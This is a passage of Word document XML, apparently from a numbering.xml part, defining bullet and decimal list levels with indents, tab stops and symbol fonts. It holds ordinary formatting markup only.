        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="DC90287A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="54829AF6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="78CC93A2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="10" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="24D843B3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000004"/>
    <w:lvl w:ilvl="0" w:tplc="D8FE41F0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="E82A370E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="7F0C79BA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="6194FCB6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="94343AF8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="9E50DB86">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="50A65342">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="64603076">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="88966976">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="11" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="25516B88"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000002"/>
    <w:lvl w:ilvl="0" w:tplc="2B48D9E8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="467C7D2C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="7CDC9DE8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="3376B366">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="DAFC72F2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="1F9C06FA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="2416A7F8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="6C34880A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="69BCF046">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2F789CAF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000005"/>
    <w:lvl w:ilvl="0" w:tplc="7B7833D0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="*"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="0018062E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="5AA619A2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="A668629C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="961E6638">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="D66C893A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="12D61E68">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="DED65ECE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="5D0C1C56">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="13" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="307F0D33"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000002"/>
    <w:lvl w:ilvl="0" w:tplc="342E552A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="9ACE7D36">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="210C3936">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="50C6129A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="0A967F94">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="F460AF88">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="9E4EA1DC">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="1D3A7A9A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="EAF43C82">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="14" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4EFCAD01"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000002"/>
    <w:lvl w:ilvl="0" w:tplc="2596434C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="2B687C0A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="00F4EF64">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="87680D60">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="7C0AEFB4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="5E28BDEC">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="A85EC8CE">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="0AE8C190">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="6B38D098">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="15" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="58051D2F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000002"/>
    <w:lvl w:ilvl="0" w:tplc="AC70B918">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="570CE368">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="B6D0E2EA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="DAC440A2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="0E3A297A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="B6CC458E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="AD10D564">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="F510FAEA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="64A8E622">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="16" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="5C410643"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000001"/>
    <w:lvl w:ilvl="0" w:tplc="57189EEC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="6D1428E8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="BF4EA428">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="32EE1AFC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="7CFEACEE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="CEF2D868">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="C054D0AC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="CC1CD3F2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="8AB2675C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="17" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6B72DA31"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000002"/>
    <w:lvl w:ilvl="0" w:tplc="F000F9EE">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="DEB2E842">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="DA741BE8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="D422C8C2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="6244220C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="7D8A7DD8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="2FD4581A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="2FFA19E2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="37F2A0C0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="18" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6C9D0D79"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000001"/>
    <w:lvl w:ilvl="0" w:tplc="258CAD5A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="-"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
      </w:rPr>
    </w:lvl>
